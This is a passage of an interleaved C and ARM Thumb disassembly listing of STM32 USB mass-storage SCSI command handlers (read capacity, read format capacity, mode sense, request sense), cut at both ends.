 8009fb8:	b2da      	uxtb	r2, r3
 8009fba:	697b      	ldr	r3, [r7, #20]
 8009fbc:	745a      	strb	r2, [r3, #17]
  hmsc->bot_data[2] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009fbe:	697b      	ldr	r3, [r7, #20]
 8009fc0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009fc4:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009fc6:	3b01      	subs	r3, #1
 8009fc8:	0a1b      	lsrs	r3, r3, #8
 8009fca:	b2da      	uxtb	r2, r3
 8009fcc:	697b      	ldr	r3, [r7, #20]
 8009fce:	749a      	strb	r2, [r3, #18]
  hmsc->bot_data[3] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009fd0:	697b      	ldr	r3, [r7, #20]
 8009fd2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009fd6:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009fd8:	b2db      	uxtb	r3, r3
 8009fda:	3b01      	subs	r3, #1
 8009fdc:	b2da      	uxtb	r2, r3
 8009fde:	697b      	ldr	r3, [r7, #20]
 8009fe0:	74da      	strb	r2, [r3, #19]

  hmsc->bot_data[4] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009fe2:	697b      	ldr	r3, [r7, #20]
 8009fe4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009fe8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009fec:	161b      	asrs	r3, r3, #24
 8009fee:	b2da      	uxtb	r2, r3
 8009ff0:	697b      	ldr	r3, [r7, #20]
 8009ff2:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009ff4:	697b      	ldr	r3, [r7, #20]
 8009ff6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ffa:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009ffe:	141b      	asrs	r3, r3, #16
 800a000:	b2da      	uxtb	r2, r3
 800a002:	697b      	ldr	r3, [r7, #20]
 800a004:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 800a006:	697b      	ldr	r3, [r7, #20]
 800a008:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a00c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a010:	0a1b      	lsrs	r3, r3, #8
 800a012:	b29b      	uxth	r3, r3
 800a014:	b2da      	uxtb	r2, r3
 800a016:	697b      	ldr	r3, [r7, #20]
 800a018:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_size);
 800a01a:	697b      	ldr	r3, [r7, #20]
 800a01c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a020:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a024:	b2da      	uxtb	r2, r3
 800a026:	697b      	ldr	r3, [r7, #20]
 800a028:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data_length = 8U;
 800a02a:	697b      	ldr	r3, [r7, #20]
 800a02c:	2208      	movs	r2, #8
 800a02e:	60da      	str	r2, [r3, #12]

  return 0;
 800a030:	2300      	movs	r3, #0

}
 800a032:	4618      	mov	r0, r3
 800a034:	371c      	adds	r7, #28
 800a036:	46bd      	mov	sp, r7
 800a038:	bd90      	pop	{r4, r7, pc}

0800a03a <SCSI_ReadCapacity16>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity16(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a03a:	b590      	push	{r4, r7, lr}
 800a03c:	b089      	sub	sp, #36	; 0x24
 800a03e:	af00      	add	r7, sp, #0
 800a040:	60f8      	str	r0, [r7, #12]
 800a042:	460b      	mov	r3, r1
 800a044:	607a      	str	r2, [r7, #4]
 800a046:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint32_t idx;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a048:	68fb      	ldr	r3, [r7, #12]
 800a04a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a04e:	68fb      	ldr	r3, [r7, #12]
 800a050:	32b0      	adds	r2, #176	; 0xb0
 800a052:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a056:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 800a058:	69bb      	ldr	r3, [r7, #24]
 800a05a:	2b00      	cmp	r3, #0
 800a05c:	d102      	bne.n	800a064 <SCSI_ReadCapacity16+0x2a>
  {
    return -1;
 800a05e:	f04f 33ff 	mov.w	r3, #4294967295
 800a062:	e0ab      	b.n	800a1bc <SCSI_ReadCapacity16+0x182>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 800a064:	68fb      	ldr	r3, [r7, #12]
 800a066:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a06a:	68fa      	ldr	r2, [r7, #12]
 800a06c:	33b0      	adds	r3, #176	; 0xb0
 800a06e:	009b      	lsls	r3, r3, #2
 800a070:	4413      	add	r3, r2
 800a072:	685b      	ldr	r3, [r3, #4]
 800a074:	685c      	ldr	r4, [r3, #4]
 800a076:	69bb      	ldr	r3, [r7, #24]
 800a078:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 800a07c:	3308      	adds	r3, #8
 800a07e:	69ba      	ldr	r2, [r7, #24]
 800a080:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 800a084:	3204      	adds	r2, #4
 800a086:	7af8      	ldrb	r0, [r7, #11]
 800a088:	4619      	mov	r1, r3
 800a08a:	47a0      	blx	r4
 800a08c:	4603      	mov	r3, r0
 800a08e:	75fb      	strb	r3, [r7, #23]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 800a090:	f997 3017 	ldrsb.w	r3, [r7, #23]
 800a094:	2b00      	cmp	r3, #0
 800a096:	d106      	bne.n	800a0a6 <SCSI_ReadCapacity16+0x6c>
 800a098:	69bb      	ldr	r3, [r7, #24]
 800a09a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a09e:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a0a2:	2b02      	cmp	r3, #2
 800a0a4:	d108      	bne.n	800a0b8 <SCSI_ReadCapacity16+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a0a6:	7af9      	ldrb	r1, [r7, #11]
 800a0a8:	233a      	movs	r3, #58	; 0x3a
 800a0aa:	2202      	movs	r2, #2
 800a0ac:	68f8      	ldr	r0, [r7, #12]
 800a0ae:	f000 fa01 	bl	800a4b4 <SCSI_SenseCode>
    return -1;
 800a0b2:	f04f 33ff 	mov.w	r3, #4294967295
 800a0b6:	e081      	b.n	800a1bc <SCSI_ReadCapacity16+0x182>
  }

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a0b8:	687b      	ldr	r3, [r7, #4]
 800a0ba:	330a      	adds	r3, #10
 800a0bc:	781b      	ldrb	r3, [r3, #0]
 800a0be:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 800a0c0:	687b      	ldr	r3, [r7, #4]
 800a0c2:	330b      	adds	r3, #11
 800a0c4:	781b      	ldrb	r3, [r3, #0]
 800a0c6:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a0c8:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 800a0ca:	687b      	ldr	r3, [r7, #4]
 800a0cc:	330c      	adds	r3, #12
 800a0ce:	781b      	ldrb	r3, [r3, #0]
 800a0d0:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 800a0d2:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 800a0d4:	687a      	ldr	r2, [r7, #4]
 800a0d6:	320d      	adds	r2, #13
 800a0d8:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 800a0da:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a0dc:	69bb      	ldr	r3, [r7, #24]
 800a0de:	60da      	str	r2, [r3, #12]

  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 800a0e0:	2300      	movs	r3, #0
 800a0e2:	61fb      	str	r3, [r7, #28]
 800a0e4:	e008      	b.n	800a0f8 <SCSI_ReadCapacity16+0xbe>
  {
    hmsc->bot_data[idx] = 0U;
 800a0e6:	69ba      	ldr	r2, [r7, #24]
 800a0e8:	69fb      	ldr	r3, [r7, #28]
 800a0ea:	4413      	add	r3, r2
 800a0ec:	3310      	adds	r3, #16
 800a0ee:	2200      	movs	r2, #0
 800a0f0:	701a      	strb	r2, [r3, #0]
  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 800a0f2:	69fb      	ldr	r3, [r7, #28]
 800a0f4:	3301      	adds	r3, #1
 800a0f6:	61fb      	str	r3, [r7, #28]
 800a0f8:	69bb      	ldr	r3, [r7, #24]
 800a0fa:	68db      	ldr	r3, [r3, #12]
 800a0fc:	69fa      	ldr	r2, [r7, #28]
 800a0fe:	429a      	cmp	r2, r3
 800a100:	d3f1      	bcc.n	800a0e6 <SCSI_ReadCapacity16+0xac>
  }

  hmsc->bot_data[4] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 800a102:	69bb      	ldr	r3, [r7, #24]
 800a104:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a108:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a10a:	3b01      	subs	r3, #1
 800a10c:	0e1b      	lsrs	r3, r3, #24
 800a10e:	b2da      	uxtb	r2, r3
 800a110:	69bb      	ldr	r3, [r7, #24]
 800a112:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 800a114:	69bb      	ldr	r3, [r7, #24]
 800a116:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a11a:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a11c:	3b01      	subs	r3, #1
 800a11e:	0c1b      	lsrs	r3, r3, #16
 800a120:	b2da      	uxtb	r2, r3
 800a122:	69bb      	ldr	r3, [r7, #24]
 800a124:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 800a126:	69bb      	ldr	r3, [r7, #24]
 800a128:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a12c:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a12e:	3b01      	subs	r3, #1
 800a130:	0a1b      	lsrs	r3, r3, #8
 800a132:	b2da      	uxtb	r2, r3
 800a134:	69bb      	ldr	r3, [r7, #24]
 800a136:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 800a138:	69bb      	ldr	r3, [r7, #24]
 800a13a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a13e:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a140:	b2db      	uxtb	r3, r3
 800a142:	3b01      	subs	r3, #1
 800a144:	b2da      	uxtb	r2, r3
 800a146:	69bb      	ldr	r3, [r7, #24]
 800a148:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 800a14a:	69bb      	ldr	r3, [r7, #24]
 800a14c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a150:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a154:	161b      	asrs	r3, r3, #24
 800a156:	b2da      	uxtb	r2, r3
 800a158:	69bb      	ldr	r3, [r7, #24]
 800a15a:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 800a15c:	69bb      	ldr	r3, [r7, #24]
 800a15e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a162:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a166:	141b      	asrs	r3, r3, #16
 800a168:	b2da      	uxtb	r2, r3
 800a16a:	69bb      	ldr	r3, [r7, #24]
 800a16c:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 800a16e:	69bb      	ldr	r3, [r7, #24]
 800a170:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a174:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a178:	0a1b      	lsrs	r3, r3, #8
 800a17a:	b29b      	uxth	r3, r3
 800a17c:	b2da      	uxtb	r2, r3
 800a17e:	69bb      	ldr	r3, [r7, #24]
 800a180:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(hmsc->scsi_blk_size);
 800a182:	69bb      	ldr	r3, [r7, #24]
 800a184:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a188:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a18c:	b2da      	uxtb	r2, r3
 800a18e:	69bb      	ldr	r3, [r7, #24]
 800a190:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a192:	687b      	ldr	r3, [r7, #4]
 800a194:	330a      	adds	r3, #10
 800a196:	781b      	ldrb	r3, [r3, #0]
 800a198:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 800a19a:	687b      	ldr	r3, [r7, #4]
 800a19c:	330b      	adds	r3, #11
 800a19e:	781b      	ldrb	r3, [r3, #0]
 800a1a0:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a1a2:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 800a1a4:	687b      	ldr	r3, [r7, #4]
 800a1a6:	330c      	adds	r3, #12
 800a1a8:	781b      	ldrb	r3, [r3, #0]
 800a1aa:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 800a1ac:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 800a1ae:	687a      	ldr	r2, [r7, #4]
 800a1b0:	320d      	adds	r2, #13
 800a1b2:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 800a1b4:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a1b6:	69bb      	ldr	r3, [r7, #24]
 800a1b8:	60da      	str	r2, [r3, #12]

  return 0;
 800a1ba:	2300      	movs	r3, #0
}
 800a1bc:	4618      	mov	r0, r3
 800a1be:	3724      	adds	r7, #36	; 0x24
 800a1c0:	46bd      	mov	sp, r7
 800a1c2:	bd90      	pop	{r4, r7, pc}

0800a1c4 <SCSI_ReadFormatCapacity>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadFormatCapacity(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a1c4:	b580      	push	{r7, lr}
 800a1c6:	b088      	sub	sp, #32
 800a1c8:	af00      	add	r7, sp, #0
 800a1ca:	60f8      	str	r0, [r7, #12]
 800a1cc:	460b      	mov	r3, r1
 800a1ce:	607a      	str	r2, [r7, #4]
 800a1d0:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint16_t blk_size;
  uint32_t blk_nbr;
  uint16_t i;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a1d2:	68fb      	ldr	r3, [r7, #12]
 800a1d4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a1d8:	68fb      	ldr	r3, [r7, #12]
 800a1da:	32b0      	adds	r2, #176	; 0xb0
 800a1dc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a1e0:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 800a1e2:	69bb      	ldr	r3, [r7, #24]
 800a1e4:	2b00      	cmp	r3, #0
 800a1e6:	d102      	bne.n	800a1ee <SCSI_ReadFormatCapacity+0x2a>
  {
    return -1;
 800a1e8:	f04f 33ff 	mov.w	r3, #4294967295
 800a1ec:	e063      	b.n	800a2b6 <SCSI_ReadFormatCapacity+0xf2>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &blk_nbr, &blk_size);
 800a1ee:	68fb      	ldr	r3, [r7, #12]
 800a1f0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a1f4:	68fa      	ldr	r2, [r7, #12]
 800a1f6:	33b0      	adds	r3, #176	; 0xb0
 800a1f8:	009b      	lsls	r3, r3, #2
 800a1fa:	4413      	add	r3, r2
 800a1fc:	685b      	ldr	r3, [r3, #4]
 800a1fe:	685b      	ldr	r3, [r3, #4]
 800a200:	f107 0214 	add.w	r2, r7, #20
 800a204:	f107 0110 	add.w	r1, r7, #16
 800a208:	7af8      	ldrb	r0, [r7, #11]
 800a20a:	4798      	blx	r3
 800a20c:	4603      	mov	r3, r0
 800a20e:	75fb      	strb	r3, [r7, #23]

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 800a210:	f997 3017 	ldrsb.w	r3, [r7, #23]
 800a214:	2b00      	cmp	r3, #0
 800a216:	d106      	bne.n	800a226 <SCSI_ReadFormatCapacity+0x62>
 800a218:	69bb      	ldr	r3, [r7, #24]
 800a21a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a21e:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a222:	2b02      	cmp	r3, #2
 800a224:	d108      	bne.n	800a238 <SCSI_ReadFormatCapacity+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a226:	7af9      	ldrb	r1, [r7, #11]
 800a228:	233a      	movs	r3, #58	; 0x3a
 800a22a:	2202      	movs	r2, #2
 800a22c:	68f8      	ldr	r0, [r7, #12]
 800a22e:	f000 f941 	bl	800a4b4 <SCSI_SenseCode>
    return -1;
 800a232:	f04f 33ff 	mov.w	r3, #4294967295
 800a236:	e03e      	b.n	800a2b6 <SCSI_ReadFormatCapacity+0xf2>
  }

  for (i = 0U; i < 12U ; i++)
 800a238:	2300      	movs	r3, #0
 800a23a:	83fb      	strh	r3, [r7, #30]
 800a23c:	e007      	b.n	800a24e <SCSI_ReadFormatCapacity+0x8a>
  {
    hmsc->bot_data[i] = 0U;
 800a23e:	8bfb      	ldrh	r3, [r7, #30]
 800a240:	69ba      	ldr	r2, [r7, #24]
 800a242:	4413      	add	r3, r2
 800a244:	2200      	movs	r2, #0
 800a246:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < 12U ; i++)
 800a248:	8bfb      	ldrh	r3, [r7, #30]
 800a24a:	3301      	adds	r3, #1
 800a24c:	83fb      	strh	r3, [r7, #30]
 800a24e:	8bfb      	ldrh	r3, [r7, #30]
 800a250:	2b0b      	cmp	r3, #11
 800a252:	d9f4      	bls.n	800a23e <SCSI_ReadFormatCapacity+0x7a>
  }

  hmsc->bot_data[3] = 0x08U;
 800a254:	69bb      	ldr	r3, [r7, #24]
 800a256:	2208      	movs	r2, #8
 800a258:	74da      	strb	r2, [r3, #19]
  hmsc->bot_data[4] = (uint8_t)((blk_nbr - 1U) >> 24);
 800a25a:	693b      	ldr	r3, [r7, #16]
 800a25c:	3b01      	subs	r3, #1
 800a25e:	0e1b      	lsrs	r3, r3, #24
 800a260:	b2da      	uxtb	r2, r3
 800a262:	69bb      	ldr	r3, [r7, #24]
 800a264:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((blk_nbr - 1U) >> 16);
 800a266:	693b      	ldr	r3, [r7, #16]
 800a268:	3b01      	subs	r3, #1
 800a26a:	0c1b      	lsrs	r3, r3, #16
 800a26c:	b2da      	uxtb	r2, r3
 800a26e:	69bb      	ldr	r3, [r7, #24]
 800a270:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((blk_nbr - 1U) >>  8);
 800a272:	693b      	ldr	r3, [r7, #16]
 800a274:	3b01      	subs	r3, #1
 800a276:	0a1b      	lsrs	r3, r3, #8
 800a278:	b2da      	uxtb	r2, r3
 800a27a:	69bb      	ldr	r3, [r7, #24]
 800a27c:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(blk_nbr - 1U);
 800a27e:	693b      	ldr	r3, [r7, #16]
 800a280:	b2db      	uxtb	r3, r3
 800a282:	3b01      	subs	r3, #1
 800a284:	b2da      	uxtb	r2, r3
 800a286:	69bb      	ldr	r3, [r7, #24]
 800a288:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = 0x02U;
 800a28a:	69bb      	ldr	r3, [r7, #24]
 800a28c:	2202      	movs	r2, #2
 800a28e:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(blk_size >>  16);
 800a290:	8abb      	ldrh	r3, [r7, #20]
 800a292:	141b      	asrs	r3, r3, #16
 800a294:	b2da      	uxtb	r2, r3
 800a296:	69bb      	ldr	r3, [r7, #24]
 800a298:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(blk_size >>  8);
 800a29a:	8abb      	ldrh	r3, [r7, #20]
 800a29c:	0a1b      	lsrs	r3, r3, #8
 800a29e:	b29b      	uxth	r3, r3
 800a2a0:	b2da      	uxtb	r2, r3
 800a2a2:	69bb      	ldr	r3, [r7, #24]
 800a2a4:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(blk_size);
 800a2a6:	8abb      	ldrh	r3, [r7, #20]
 800a2a8:	b2da      	uxtb	r2, r3
 800a2aa:	69bb      	ldr	r3, [r7, #24]
 800a2ac:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = 12U;
 800a2ae:	69bb      	ldr	r3, [r7, #24]
 800a2b0:	220c      	movs	r2, #12
 800a2b2:	60da      	str	r2, [r3, #12]

  return 0;
 800a2b4:	2300      	movs	r3, #0
}
 800a2b6:	4618      	mov	r0, r3
 800a2b8:	3720      	adds	r7, #32
 800a2ba:	46bd      	mov	sp, r7
 800a2bc:	bd80      	pop	{r7, pc}
	...

0800a2c0 <SCSI_ModeSense6>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense6(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a2c0:	b580      	push	{r7, lr}
 800a2c2:	b086      	sub	sp, #24
 800a2c4:	af00      	add	r7, sp, #0
 800a2c6:	60f8      	str	r0, [r7, #12]
 800a2c8:	460b      	mov	r3, r1
 800a2ca:	607a      	str	r2, [r7, #4]
 800a2cc:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a2ce:	68fb      	ldr	r3, [r7, #12]
 800a2d0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a2d4:	68fb      	ldr	r3, [r7, #12]
 800a2d6:	32b0      	adds	r2, #176	; 0xb0
 800a2d8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a2dc:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE6_LEN;
 800a2de:	2317      	movs	r3, #23
 800a2e0:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a2e2:	693b      	ldr	r3, [r7, #16]
 800a2e4:	2b00      	cmp	r3, #0
 800a2e6:	d102      	bne.n	800a2ee <SCSI_ModeSense6+0x2e>
  {
    return -1;
 800a2e8:	f04f 33ff 	mov.w	r3, #4294967295
 800a2ec:	e011      	b.n	800a312 <SCSI_ModeSense6+0x52>
  }

  if (params[4] <= len)
 800a2ee:	687b      	ldr	r3, [r7, #4]
 800a2f0:	3304      	adds	r3, #4
 800a2f2:	781b      	ldrb	r3, [r3, #0]
 800a2f4:	b29b      	uxth	r3, r3
 800a2f6:	8afa      	ldrh	r2, [r7, #22]
 800a2f8:	429a      	cmp	r2, r3
 800a2fa:	d303      	bcc.n	800a304 <SCSI_ModeSense6+0x44>
  {
    len = params[4];
 800a2fc:	687b      	ldr	r3, [r7, #4]
 800a2fe:	3304      	adds	r3, #4
 800a300:	781b      	ldrb	r3, [r3, #0]
 800a302:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense6_data, len);
 800a304:	8afb      	ldrh	r3, [r7, #22]
 800a306:	461a      	mov	r2, r3
 800a308:	4904      	ldr	r1, [pc, #16]	; (800a31c <SCSI_ModeSense6+0x5c>)
 800a30a:	6938      	ldr	r0, [r7, #16]
 800a30c:	f000 feb8 	bl	800b080 <SCSI_UpdateBotData>

  return 0;
 800a310:	2300      	movs	r3, #0
}
 800a312:	4618      	mov	r0, r3
 800a314:	3718      	adds	r7, #24
 800a316:	46bd      	mov	sp, r7
 800a318:	bd80      	pop	{r7, pc}
 800a31a:	bf00      	nop
 800a31c:	2000011c 	.word	0x2000011c

0800a320 <SCSI_ModeSense10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a320:	b580      	push	{r7, lr}
 800a322:	b086      	sub	sp, #24
 800a324:	af00      	add	r7, sp, #0
 800a326:	60f8      	str	r0, [r7, #12]
 800a328:	460b      	mov	r3, r1
 800a32a:	607a      	str	r2, [r7, #4]
 800a32c:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a32e:	68fb      	ldr	r3, [r7, #12]
 800a330:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a334:	68fb      	ldr	r3, [r7, #12]
 800a336:	32b0      	adds	r2, #176	; 0xb0
 800a338:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a33c:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE10_LEN;
 800a33e:	231b      	movs	r3, #27
 800a340:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a342:	693b      	ldr	r3, [r7, #16]
 800a344:	2b00      	cmp	r3, #0
 800a346:	d102      	bne.n	800a34e <SCSI_ModeSense10+0x2e>
  {
    return -1;
 800a348:	f04f 33ff 	mov.w	r3, #4294967295
 800a34c:	e011      	b.n	800a372 <SCSI_ModeSense10+0x52>
  }

  if (params[8] <= len)
 800a34e:	687b      	ldr	r3, [r7, #4]
 800a350:	3308      	adds	r3, #8
 800a352:	781b      	ldrb	r3, [r3, #0]
 800a354:	b29b      	uxth	r3, r3
 800a356:	8afa      	ldrh	r2, [r7, #22]
 800a358:	429a      	cmp	r2, r3
 800a35a:	d303      	bcc.n	800a364 <SCSI_ModeSense10+0x44>
  {
    len = params[8];
 800a35c:	687b      	ldr	r3, [r7, #4]
 800a35e:	3308      	adds	r3, #8
 800a360:	781b      	ldrb	r3, [r3, #0]
 800a362:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense10_data, len);
 800a364:	8afb      	ldrh	r3, [r7, #22]
 800a366:	461a      	mov	r2, r3
 800a368:	4904      	ldr	r1, [pc, #16]	; (800a37c <SCSI_ModeSense10+0x5c>)
 800a36a:	6938      	ldr	r0, [r7, #16]
 800a36c:	f000 fe88 	bl	800b080 <SCSI_UpdateBotData>

  return 0;
 800a370:	2300      	movs	r3, #0
}
 800a372:	4618      	mov	r0, r3
 800a374:	3718      	adds	r7, #24
 800a376:	46bd      	mov	sp, r7
 800a378:	bd80      	pop	{r7, pc}
 800a37a:	bf00      	nop
 800a37c:	20000134 	.word	0x20000134

0800a380 <SCSI_RequestSense>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_RequestSense(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a380:	b580      	push	{r7, lr}
 800a382:	b086      	sub	sp, #24
 800a384:	af00      	add	r7, sp, #0
 800a386:	60f8      	str	r0, [r7, #12]
 800a388:	460b      	mov	r3, r1
 800a38a:	607a      	str	r2, [r7, #4]
 800a38c:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  uint8_t i;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a38e:	68fb      	ldr	r3, [r7, #12]
 800a390:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a394:	68fb      	ldr	r3, [r7, #12]
 800a396:	32b0      	adds	r2, #176	; 0xb0
 800a398:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a39c:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 800a39e:	693b      	ldr	r3, [r7, #16]
 800a3a0:	2b00      	cmp	r3, #0
